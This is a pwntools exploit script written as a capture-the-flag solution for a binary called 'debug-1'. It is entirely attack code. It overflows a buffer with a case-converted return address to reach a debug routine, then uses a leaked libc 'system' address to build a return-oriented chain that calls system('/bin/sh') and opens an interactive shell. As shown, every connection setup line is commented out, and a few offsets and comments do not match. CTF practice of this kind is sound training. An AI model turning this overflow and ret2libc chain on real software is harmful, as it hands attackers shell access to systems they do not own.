from pwn import *

elf = context.binary = ELF('./debug-1')
libc = ELF('./libc.so.6')
#libc = ELF('/lib64/libc.so.6')

context.log_level='debug'

#p = remote("ctf.cybr.club", 443, ssl=True, sni="debug-1")
#p = remote("localhost", 1337)
#p = process('./debug-1')
#p = gdb.debug('./debug-1')


# Convert int address to bytearray
def tobytearray(a):
    # If first number in byte is a 0
    if (len(hex(a))%2==1):
        return bytearray.fromhex("0" + hex(a)[2:])
    return bytearray.fromhex(hex(a)[2:])

# Convert bytearray to int
def tohex(a):
    return int(a.hex(), 16)

# Converts characters in payload based on character conversion
def convert(a):
    x = tobytearray(a)
    for i in range(len(x)):
        if (x[i] >= 65 and x[i] <= 90):
            x[i] = x[i]+32
        elif (x[i] >= 97 and x[i] <= 122):
            x[i] = x[i]-32
    return tohex(x)


# ret = 0x000000000000101a ; used to deal with stack alignment
ret = elf.address + 0x000000000000101a
ret = 0x0000000000401016

# Specific address in debug after admin check
addr = elf.sym["debug"] + 0x1
payload1 = cyclic(88) + p64(convert(addr))

# Step 1: go to debug()
p.recvuntil(b"3: Exit\n")
p.sendline("1")
p.recvuntil(b"string (max length of 69 characters):\n")
p.send(payload1)




# Step 2: ROPchain
p.recvuntil(b"well :) )")
p.sendline("1")

p.recvuntil("libc leak: ")
system = int(p.recvline()[:-1].decode("utf-8"), 16)
print("System leak:", hex(system))
libc.address = system - libc.sym["system"]
print("libc base:", hex(libc.address))

# Location of pop rdi ; ret : 0x000000000002a3e5
pop_rdi = libc.address + 0x0000000000023a5f
bin_sh = next(libc.search(b"/bin/sh\x00"))

p.recvuntil(b"characters)!")

payload2 = cyclic(104) + p64(pop_rdi) + p64(bin_sh) + p64(libc.sym["system"])
p.send(payload2)

p.interactive()

